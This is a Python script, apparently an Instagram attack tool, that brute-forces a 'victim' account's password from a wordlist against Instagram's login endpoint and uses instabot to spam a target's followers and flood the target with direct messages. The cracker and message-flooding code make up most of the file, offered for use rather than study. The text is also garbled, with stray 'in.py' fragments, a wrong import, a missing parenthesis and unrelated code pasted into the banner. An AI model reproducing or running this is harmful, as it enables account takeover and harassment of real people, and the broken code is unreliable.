def notInstalled(module):
    print(f'You dont have installed', module)
    print(f'Write command: python3 -m pip install', module)
    exit()

import os
import sys
import random
try:
    import argparse as arg
except:
    notInstalled('argparse')
try:
    import request
except:
    notInstalled('requests')
try:
    from instabot import Bot
except:
    notInstalled('insabot')
    
from time import sleep
from datetime import datetime
from colorama import init, Fore


init(autoreset=True)


class Advertisement:
    warning = Fore.LIGHTYELLOW_EX + '<' + Fore.LIGHTBLACK_EX + '!' + Fore.LIGHTYELLOW_EX + '> '
    message = Fore.LIGHTBLACK_EX + '+' + Fore.LIGHTYELLOW_EX + '> '
    information = Fore.LIGHTYELLOW_EX + '<' + Fore.LIGHTBLACK_EX + 'data' + Fore.LIGHTYELLOW_EX + '> '
    end = Fore.LIGHTYELLOW_EX + '/' + Fore.LIGHTBLACK_EX + '>' + '/ '
    suggest = Fore.BLUE + '*' + Fore.LIGHTBLUE_EX + '> '
    step = Fore.LIGHTBLUE_EX + '<' + Fore.LIGHTBLACK_EX + '!' + Fore.LIGHTBLUE_EX + '> '


parser = arg.ArgumentParser()

proxy = parser.add_argument_group('  PROXY')
proxy.add_argument('--proxy', help='[your proxy here]' ,type=str)

positional = parser.add_argument_group(' POSITIONAL')
positional.add_argument('max', help='[max count to actions]', type=int)
positional.add_argument('user', help='[your victim here]',type=str)

df = parser.add_argument_group(' GETTER')

df.add_argument('-fol', help='[user to follow his followers]', action='store_true')
df.add_argument('-msg', help='[your message here (send to all followers user)]', type=str)
df.add_argument('--getinfo', help='[get information of followers user]', action='store_true')
df.add_argument('--media', help='[send pic as dm (filepath here)]', type=str)
df.add_argument('--sendprof', help='[send profile (enter profile to send)]', type=str)

hnt = parser.add_argument_group(' HUNTER')
hnt.add_argument('-dm', help='[send massive dm´s to user victim (your message here)]', type=str)

crk = parser.add_argument_group('  CRACK')
crk.add_argument('-file', help='[file with passwords here]', type=str)

args = parser.parse_args()
in.py
_victim_ = args.user
limit = args.max

def clean():
    os.system(['clear', 'cls'][os.name == 'nt']

clean()

banner1 = """
 ██▓  ▄████       ██▓    ▄▄▄       ███▄    █  ▄▄▄▄    ▒█████  ▄▄▄█████▓     def see_mysocial():
▓██▒ ██▒ ▀█▒     ▓██▒   ▒████▄     ██ ▀█   █ ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒           my_name = Mynor Estrada
▒██▒▒██░▄▄▄░     ▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░           social = {
░██░░▓█  ██▓     ▒██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██░█▀  ▒██   ██░░ ▓██▓ ░                      'yt':'GlandesMates',
░██░░▒▓███▀▒ ██▓ ░██████▒▓█   ▓██▒▒██░   ▓██░░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░                      'github:'GlandesMates'
░▓   ░▒   ▒  ▒▓▒ ░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░              {
 ▒ ░  ░   ░  ░▒  ░ ░ ▒  ░ ▒   ▒▒ ░░ ░░   ░ ▒░▒░▒   ░   ░ ▒ ▒░     ░               print(my_name)
 ▒ ░░ ░   ░  ░     ░ ░    ░   ▒      ░   ░ ░  ░    ░ ░ ░ ░ ▒    ░                       for i in social:
 ░        ░   ░      ░  ░     ░  ░         ░  ░          ░ ░                                print(f'{i}:{social[i]}')
              ░                                    ░                        see_mysocial()
                #Use -h command to see all options
"""
print('\n\n')
colors = Fore.LIGHTBLUE_EX, Fore.BLUE, Fore.CYAN, Fore.LIGHTMAGENTA_EX
for banner in banner1:
    print(random.choice(colors) + banner, end='')in.py
    sys.stdout.flush()
    sleep(0)


global count
count = 0


def cracker(user, pwd):
    link = 'https://www.instagram.com/accounts/login/'
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    time = int(datetime.now().timestamp())
    
    payload = {
        'username': user,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    with requests.Session() as s:
        r = s.get(link)
        r = s.post(login_url, data=payload, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
        })

        global data
        data = r.json()

if args.file:

    try:
        count = 0
        with open(args.file, 'r') as file:
            for pwd in file.readlines():
                cracker(_victim_, pwd)
                try:
                    if data['authenticated'] == False:
                        clean()
                        print(f'\t{pwd} \tis not the password')
                    elif data['authenticated'] == True:
                        print(f'\tCracked! {_victim_}||{pwd} > is the password')
                    else:
                        print(data)
                        break
                except:
                    print(data)
                    pass
                count += 1
                if count == limit:
                    print(f'\tProcess finished cause limit has reached, passwords tried: {limit}. Last password {pwd}')
                    break
    except KeyboardInterrupt or Exception as e:
        if e is False:
            print('The user breaks the script')
        else:in.py
            print(f'File {args.file} does not exists')
            raise e
    exit()        

global bot
if args.proxy:
    bot = Bot(
        unfollow_delay=1, follow_delay=1, filter_private_users=True,
        filter_users_without_profile_photo=True, filter_verified_accounts=True, message_delay=1, proxy=args.proxy
    )
elif not args.proxy:
    bot = Bot(
        unfollow_delay=1, follow_delay=1, filter_private_users=True,
        filter_users_without_profile_photo=True, filter_verified_accounts=True, message_delay=1
    )


print('\n' + Advertisement.warning + Fore.CYAN +
      ' After this, you need to delete the session and cookies archives, and you can change the users list''\n''\n')

user = input(Advertisement.step + Fore.WHITE + '\tUsername: ')
pwd = input(Advertisement.step + Fore.WHITE + '\tPassword: ')
print('\n')

try:
    if not args.file:
        bot.login(username=user, password=pwd)
    else:
        pass
except Exception as e:
    print(f'\tCan not login with {user} for cause:\n {e}')

global victim, followers
victim = bot.get_user_id_from_username(_victim_)
followers = bot.get_user_followers(victim, nfollows=limit)

def user_or_error(error):
    if error is True:
        print(e)
    else:
        print(
            '\n\t\t' + Advertisement.warning + Fore.RED + 'Process interrupted by user'
        )

def info(user):
    if args.getinfo == True:
        bot.get_user_info(user)
    else:
        pass

if args.fol and args.msg:
    try:
        global unfollow
        unfollow = []

        for usr in followers:
            try:
                info(usr)
                bot.follow(usr)
                bot.send_message(args.msg, usr)
                unfollow.append(usr)
                count += 1
                print(f'\n\tMessages sended & users followed {count}')
            except KeyboardInterrupt or Exception as e:
                user_or_error(e)
            if count == limit:
                print('\n\tProcess finished. Starting unfollow users')
                try:
                    for unf in unfollow:
                        bot.unfollow(unf)
                except KeyboardInterrupt or Exception as e:
                    user_or_error(e)
                break
    except KeyboardInterrupt or Exception as e:
        user_or_error(e)
elif args.fol and not args.msg:
    try:
        while count != limit:
            bot.follow_followers(victim, nfollows=limit)
            count += 1
            if count == limit:
                print(f'\n\tSucesfully followed {limit} users. Starting unfollowing users')
                bot.unfollow_non_followers()
                break
    except KeyboardInterrupt or Exception as e:
        user_or_error(e)
elif args.msg and not args.fol:
    try:
        for usr in followers:
            bot.send_message(args.msg, usr)
            if args.media:
                bot.send_photo(usr, args.media)
            if args.sendprof:
                bot.send_profile(args.sendprof, usr, args.msg)
            count += 1
            print(f'\tMessages sended {count}')
            if count == limit:
                print(f'\tSucesfully sended {limit} messages')
                break
    except KeyboardInterrupt or Exception as e:
        user_or_error(e)
if args.dm:
    while count != limit:
        bot.send_message(args.dm, victim)
        count += 1
        print(f'\n\tYou send {count} messages to user {_victim_}')
        if count == limit:
            print(f'\n\tYou finally send {limit} messages to user {_victim_}')
            break


if not args.file:

    bot.logout()

    os.chdir('config')
    os.remove(f'{user}.checkpoint')
    os.remove(f'{user}_uuid_and_cookie.json')
    
    print(
        Advertisement.message +
        Fore.CYAN +
        '\n\t\t\t\tSee you later influencer ;)\n'
    )
else:
    print(

        Advertisement.message +
        Fore.CYAN +
        '\n\t\t\t\tSee you later influencer ;)\n'
    )
